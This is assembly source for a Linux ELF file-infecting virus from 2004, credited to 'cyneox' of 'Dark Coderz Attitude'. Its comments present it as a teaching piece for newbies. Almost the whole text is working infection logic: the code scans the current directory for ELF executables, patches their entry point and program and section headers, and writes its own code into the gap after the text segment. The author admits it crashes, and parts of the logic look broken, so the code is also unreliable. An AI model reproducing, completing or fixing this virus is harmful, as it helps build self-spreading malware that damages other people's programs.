
;*******************************************
;************* www,cyneox.tk ***************
;*******************************************
;
;
; hello good ppl.here i'm again with my new creation... this virus didn't
; worked on my computer (->Segmentation fault) , i don't know why.but thats
; not the important thing.most important are the techniques i used here to 
; infect executable binaries.the purpose of this source is to help newbies
; (linux newbies ;] ) to understand how files get infected under linux.
; i commented the code very much so they can understand what i'm talking
; about.i remember when i was a newbie too...man that was hard.but here i am
; telling you some shit which you might never understand.
; you might ask yourself why i wrote a such code.well as first source
; published by DCA (Dark Coderz Attitude) i wanted to do sth special.
; 
;
;
; REMEMBER : THIS SOURCE CONTAINS ONLY TECHNIQUES HOW TO INFECT ELF FILES
; UNDER LINUX ! 
;
;
; 17.5.2004 by cyneox | D.C.A 
;
;
; TO COMPILE: nasm -f elf cyneox.asm
;           : ld -e main -o cyneox cyneox.o
;
;************************************************************************



section .text
global main

main:  ; here we'll save the contains of all register on stack...
       ; finally we create a stack frame by saving the old ebp on the stack
	 ; and updating esp with the address of the old ebp

		    
                pusha
                pushf
		    push ebp
		    mov ebx,[esp+8]         ; getting addres of argv[0]
		    mov eax,[ebx]           ; storing own name (host)
		    mov esp,ebp
		    

_boo:   ; now we create enough space for the stack where we can store our data
        ; and then we'll store the current working directory on the stack
               sub esp,1840  
               mov esi,eax		 		   
		   mov eax,183            ; SYS_GETCWD
		   mov ebx,esp
		   add ebx,820
		   mov ecx,1024           ; path_lenght
		   mov edx,1
		   int 0x80

open:   ; here i'll get the e_entry of host ( with host i mean the binary
        ; which we are now executing) and store it to stack.i do that coz
	  ; i must now where the virus is ( in a infected file) so i can infect other
        ; files by coping the virus in the host file from e_entry...

		   mov eax,5              ; SYS_OPEN
		   mov ebx,esi            ; esi = argv[0]
		   mov ecx,0
		   int 0x80

		   xchg eax,ebx           ; ebx = fd
		   mov eax,3              ; SYS_READ
		   sub esp,45             ; needed for the first bytes of the file
		                          ; so that we can extract the e_entry
		   mov ecx,esp
		   mov edx,44
		   int 0x80

               mov ecx,[esp+0x18]    ; ELF
		   mov dword [esp+45+1840-4],ecx ; store temporary e_entry oh argv[0]
		   add esp,45            ; restoring temp stack

		   mov eax,6             ; SYS_CLOSE
		   int 0x80
		   
        ; we'll "open" the current working directory "." and  then we'll copy
        ; the file descriptor which we'll need to infect the files that the
        ; directory contains...
		   
		   mov eax,5             ; SYS_OPEN
		   mov ebx,point         ; 0x002e="."
		   mov ecx,0
		   int 0x80
		   
		   ; checking if open() returned successfully...
		   cmp eax,0
		   jge ok_stat
		   jmp exit
		   
ok_stat:          
               xchg eax,ebx          ; ebx=fd
               xor eax,eax
		   
		   ; reading the directory and searching for files to infect
		   
		   mov ecx,esp
		   add ecx,554
readdir:	  
               mov eax,89           ; SYS_READDIR
		   int 0x80
		   
		   dec eax              ; cmp eax,1
		   jz ok_dir            ; jne exit
		   jmp exit             ; jmp ok_dir
	
	; here we actually start our infect function coz we got the file name
	; and the next to do is to check if we have read-write rights on that file

ok_dir:            
               mov esi,[esp+1840-4] ; esi = e_entry

		   pusha                ; save registers before infecting

        ; here i'll beginn to check that file wheter it is a ELF file and wheter we can execute it.
	  ; remember: in linux you have objects,relocatables,libraries etc.

		   sub esp,60           ; creating space
		   mov ebx,ecx
		   add ebx,10
		   mov eax,ebx
		   mov dword [esp+60-44],ebx ; saving file name to stack
		   mov dword [esp+60-48],esi ; saving e_entry to stack 

		   mov eax,5            ; SYS_OPEN
		   xor ecx,ecx
		   mov ecx,2            ; O_RDWR
		   int 0x80

		   mov dword [esp+60-4],eax ; storing fd to stack
		   
               cmp eax,0
		   jg stat
		   
back:		   mov eax,6
		   mov ebx,[esp+60-4]
		   int 0x80
		   
		   add esp,60
		   popa 
		   jmp readdir

stat:		   

       ; stat the file so that we're able to mmap to file coz i don't want to
       ; modify the file during "execution" since we have read-write rights
       ; from the stat structure we need only the file lenghts needed for
       ; the mmap function ...
                  
		   mov eax,106                    ; SYS_STAT

		   ; "defining" stat structure (thats a funny mode to
               ; declare a structure,isn't it ??? i'm still used to c ;)  )

		   sub esp,64                     ; struct stat *stat ;
		   mov ecx,esp
		   int 0x80
		   
		   mov eax,[esp+20]               ; file lenght from stat struct
		   add esp,64                     ; restoring stat struture
		   mov [esp+60-8],eax             ; file lenght
		   

mmap:
     ; mmapping our file to check if is a executable ELF file
     ; and for writting the infected file back to host...

               mov eax,90           ; SYS_MMAP
		   mov ecx,[esp+60-8]   ; file lenght
		   mov edx,[esp+60-4]   ; fd
		   sub esp,24           ; mmap structure
		   mov dword [esp],0    ; int start
		   mov [esp+4],ecx      ; file lenght
		   mov dword [esp+8],3  ; 3 = READ_WRITE
		   mov dword [esp+12],2 ; 2 = MMAP_PRIVATE
		   mov dword [esp+16],edx ; fd
		   mov dword [esp+20],0 ; offset = 0
		   mov ebx,esp          ; ptr to our mmap structure
		   int 0x80

		   add esp,24           ; restore mmap structure
		   cmp eax,-1
		   jne ok_mmap
		   
close:         mov eax,6            ; SYS_CLOSE
		   mov ebx,[esp+60-4]   ; fd
		   int 0x80

		   add esp,60           ; restore stack we have defined in ok_dir(top)

		   popad                ; pop contains of registers
                                        ; ...needed for the function readdir , which
					; needs ecx(address of dirent structure)
					; and ebx (file descriptor of that dir)

		   jmp readdir
		   
ok_mmap:
               mov dword [esp+60-12],eax
               mov edx,eax          ; pointer to our mapped file
		   mov ebx,[edx]
		   mov eax,0x464c457f   ; ELF
		   cmp ebx,eax
		   je ok_elf
		   jmp no_elf
		   
ok_elf:           
		   ; checking if this file can be executed ...
               ; we don't want any object files or sth like that.
               ; i don't even know who to infect them ;( i hope i'll code in
               ; the future a object infector too.

		   mov eax,[esp+60-12]
		   add eax,16
		   cmp eax,1073844240         ; integer of ET_EXEC=1073844240
               je is_ex
		   jmp no_elf

      ; checking if file is executable.you might wondering whats
      ; "1073844240" ??? well let me explain it to you: in <elf.h>
      ; i found that ET_EXEC=2. printf("%x",e_type) showed to me several
      ; outputs.and i observed by the executables files that they had a
      ; specific hex-code.so i transformed that hex-code in an integer
      ; so that i compare e_type with my integer.in my code i found out
      ; that the integer of ET_EXEC is 1073844240.if you didn't understand
      ; that please mail : cyneox@hotmail.com
      
is_ex:          
		 

     ; saving all necesary info from EHDR to stack.
     ; those are several techniques that i also used in my last virus(herderv)
     ; they're quite good and you should use them too... ;)

chk_ehdr:
               mov esi,[esp+60-12]
               mov eax,[esi+0x18]        ; e_entry
		   mov dword [esp+60-16],eax
		   mov eax,[esi+0x1c]
		   mov dword [esp+60-20],eax ; e_phoff
		   mov eax,[esi+0x20]
		   mov dword [esp+60-24],eax ; e_shoff
		   mov eax,dword [esi+0x2c]
		   and eax,0xffff
		   mov dword [esp+60-28],eax ; e_phnum
		   mov eax,dword [esi+0x2c]
		   and eax,0xffff
		   mov dword [esp+60-32],eax ; e_shnum

    
    ; we want to insert our virus between the end of .text section and
    ; the beginning of .data section.so we have to calculate the offset
    ; between these segments and then compare it with our virus lenght
    ; so that we can insert our virus there.

chk_space:
               mov esi,[esp+60-12]       ; ptr to mapped file
		   mov ebx,[esp+60-20]       ; e_phoff
		   add esi,ebx               ; phdr[0]
		   mov ecx,[esi+32*3+8]      ; phdr[3].p_vaddr -
                                             ; FLAGS:RW(data segment)

		   mov eax,[esi+32*3+16]     ; phdr[3].p_filesz
		   mov ebx,[esi+32*2+16]     ; phdr[2].p_filesz
		   mov dword [esp+60-36],ebx
		   mov eax,[esi+32*2+8]      ; phdr[2].p_vaddr - FLAGS:
                                             ; RE(text segment)
					     

		   add ebx,[esi+32*2+8]      ; end of phdr[2] (text segment)
		   sub ecx,ebx

		   mov eax,0x1000
		   cmp ecx,eax
		   jl near err_to_small      ; there is no space where to
                                             ; write our virus
					
    ; patching the entry point of file: the new entry point will be the end
    ; of the .text section where we insert our virus later.


patch_ehdr:
               mov ebx,[esp+60-16]       ; e_entry
		   add ebx,[esp+60-36]       ; phdr[2].p_filesz
		   mov esi,[esp+60-12]       ; ptr to mapped file
		   mov dword [esi+0x18],ebx  ; fix entry point
		   
		

patch_shoff:
               add dword [esi+32],0x1000


   ; patching the PHDR : if p_offset of that phdr struture = 0 -> this phdr
   ; belongs to the .text section -> p_filesz and p_memsz will be increased
   ; with the virus lenght
   ; if p_offset isn't 0 -> the p_filesz from .text seg
   ; will be compared with the p_offset -> if p_filesz is greater that phdr
   ; will not be patched , if not the p_offset will be with vir lenght patched


patch_phdr:
               mov ecx,[esp+60-28]       ; e_phnum
		   mov edx,[esp+60-20]       ; e_phoff
		   mov esi,[esp+60-12]       ; ptr to mapped file
		   add esi,edx               ; mov to fist seg og PHDR
		   mov eax,[esp+60-36]       ; phdr[2].p_filesz

read_phdr:
		   cmp dword [esi+4],0       ; is this .text ???p_offset =
                                             ; [esi+4]=0

		   jne no_phdr_patch
		   add dword [esi+16],0x1000  ; patch phdr[2].p_filesz
		   add dword [esi+20],0x1000  ; patch phdr[2].p_memsz

no_phdr_patch:
               cmp eax,[esi+4]
		   jg dont_patch_ph           ; if p_filesz > p_offset
               add dword [esi+4],0x1000   ; patching p_offset

dont_patch_ph:
               add esi,0x20               ; offset to next pht entry
		   loop read_phdr
		   
   ; patching SHDR: if phdr[2].p_filesz == offset to end of SHDR entry then
   ; sh_size will be patched , if not the sh_offset will be compared with
   ; phdr[2].p_filesz -> if sh_offset lower there'll be no patch , else
   ; patch sh_offset ...

patch_shdr:
               mov ecx,[esp+60-32]       ; e_shnum
		   mov edx,[esp+60-24]       ; e_shoff
		   mov esi,[esp+60-12]       ; ptr to mapped file
		   add esi,edx               ; sh[0]
		   mov eax,[esp+60-36]       ; phdr[2].p_filesz

read_shdr:
               mov ebx,[esi+16]          ; sh_offset
		   add ebx,[esi+20]          ; [esi+20]=sh_size
		   mov eax,[esp+60-36]
		   cmp ebx,eax
		   jne no_shdr_patch

		   ; patching .text section
		   add dword [esi+20],0x1000 ; patching sh_size

no_shdr_patch:
               cmp [esi+16],eax
		   jl dont_patch_sh

		   add dword [esi+16],0x1000 ; patching sh_offset

dont_patch_sh:
               add esi,40                ; next entry in the shdr table
		   loop read_shdr
		   ;jmp no_elf
		   
start_vir: 
               mov esi,dword [esp+60-48] ; from where to copy the virus
		   mov eax,[esp+60-4]
		   mov dword [esp+60-52],eax ; fd to write the virus
		   
		   ; writting until end of old .text section (phdr[2].p_filesz)
		   mov ebx,eax               ; ebx = 4
		   mov eax,4                 ; SYS_WRITE
		   mov ecx,[esp+60-12]
		   mov edx,[esp+60-36]
		   int 0x80
		   
		   ; write the virus...
		   mov eax,4
		   mov ecx,esi
		   mov edx,0x1000
		   int 0x80
		   
		   mov eax,19               ; SYS_LSEEK
		   mov ecx,[esp+60-36]
		   add ecx,0x1000
		   mov edx,0                ; SEEK_SET
		   int 0x80
		   
		   ; writting after virus ...
		   mov eax,4
		   mov ecx,[esp+60-36]     ; phdr[2].p_filesz
		   mov edx,[esp+60-8]      ; file lenght 
		   sub edx,ecx             ; remaining bytes to write
		   int 0x80 
		   
		   jmp no_elf

err_to_small:                
no_elf:
               mov eax,91
		   mov ebx,[esp+60-12]       ; pointer to our mapped file
		   mov ecx,[esp+60-8]        ; file lenght
		   int 0x80

		   jmp close

exit:
               add esp,1840
               pop ebp
		   popf
		   popa
		   xor eax,eax
		   inc eax
		   int 0x80

point db '.',0
vir_len equ  $-main
